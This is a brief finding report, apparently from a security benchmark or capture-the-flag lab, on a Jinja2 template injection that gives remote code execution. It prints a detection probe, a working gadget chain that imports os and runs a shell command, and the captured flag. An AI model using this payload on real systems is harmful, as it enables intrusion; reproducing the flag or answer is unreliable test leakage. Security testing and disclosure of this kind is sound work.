# F-072 — Jinja2 SSTI RCE (XBEN-076-24)

- **Severity:** CRITICAL
- **Confidence:** `confirmed`

## One-sentence why it's real
`name` is evaluated as a Jinja2 template (`{{7*'7'}}` → `'7777777'`, confirming genuine Python
semantics); `self.__init__.__globals__.__builtins__.__import__('os').popen('cat
/tmp/flag').read()` reaches unsandboxed OS command execution, cross-checked with a second
gadget, returning `FLAG{c01aac1a1acd14273815f261db35d3723ce38bc30730f673b31707f8c99f4064}` —
confirmed independently twice.

## Full evidence
`evidence/xben-076-24-2026-07-05/attempts.md`.

## Status
`reported`.
